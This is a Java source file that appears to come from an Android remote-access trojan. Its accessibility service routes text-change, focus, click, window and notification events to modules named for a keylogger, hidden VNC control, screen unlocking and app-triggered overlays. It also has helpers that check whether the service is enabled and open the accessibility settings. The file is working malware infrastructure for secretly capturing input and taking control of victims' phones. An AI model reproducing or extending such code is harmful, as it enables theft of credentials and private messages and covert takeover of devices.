package com.fason.app.core;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.fason.app.features.hvnc.HVncAccessibilityService;
import com.fason.app.features.inspector.InspectorAccessibilityService;
import com.fason.app.features.keylogger.KeyloggerManager;
import com.fason.app.features.overlay.AppTriggerMonitor; // [OVERLAY] Batch A
import com.fason.app.features.unlock.UnlockManager;

public class FasonAccessibilityService extends AccessibilityService {
    private static final String TAG = "FasonA11y";
    private static volatile FasonAccessibilityService instance;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        HVncAccessibilityService.onHostConnected(this);
        InspectorAccessibilityService.onHostConnected(this);
        KeyloggerManager.onHostConnected(this);
        UnlockManager.onHostConnected(this);
        AppTriggerMonitor.onHostConnected(this); // [OVERLAY] Batch A
        Log.i(TAG, "Accessibility service connected");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        try {
            int type = event.getEventType();
            if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                HVncAccessibilityService.onAccessibilityEvent(event);
                KeyloggerManager.onAccessibilityEvent(event);
                AppTriggerMonitor.onAccessibilityEvent(event); // [OVERLAY] Batch A — filters internally for WINDOW_STATE_CHANGED
            } else if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
                       type == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
                KeyloggerManager.onAccessibilityEvent(event);
            } else if (type == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                KeyloggerManager.onAccessibilityEvent(event);
            } else if (type == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
                KeyloggerManager.onAccessibilityEvent(event);
            } else if (type == AccessibilityEvent.TYPE_ANNOUNCEMENT) {
                InspectorAccessibilityService.onAccessibilityEvent(event);
            }
        } finally {
            try { event.recycle(); } catch (Exception ignored) {}
        }
    }

    @Override
    public void onInterrupt() {
        Log.w(TAG, "Service interrupted");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        HVncAccessibilityService.onHostDisconnected();
        InspectorAccessibilityService.onHostDisconnected();
        KeyloggerManager.onHostDisconnected();
        UnlockManager.onHostDisconnected();
        AppTriggerMonitor.onHostDisconnected(); // [OVERLAY] Batch A
        instance = null;
        Log.i(TAG, "Service destroyed");
    }

    public static FasonAccessibilityService getInstance() {
        return instance;
    }

    public static boolean isServiceConnected() {
        return instance != null;
    }

    public static boolean isEnabled() {
        try {
            Context ctx = FasonApp.getContext();
            String enabled = Settings.Secure.getString(
                ctx.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabled == null) return false;
            String serviceName = ctx.getPackageName() + "/com.fason.app.core.FasonAccessibilityService";
            for (String token : enabled.split(":")) {
                if (token.equals(serviceName)) return true;
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    public static void openSettings() {
        try {
            Context ctx = FasonApp.getContext();
            android.content.Intent intent = new android.content.Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
        } catch (Exception ignored) {}
    }
}
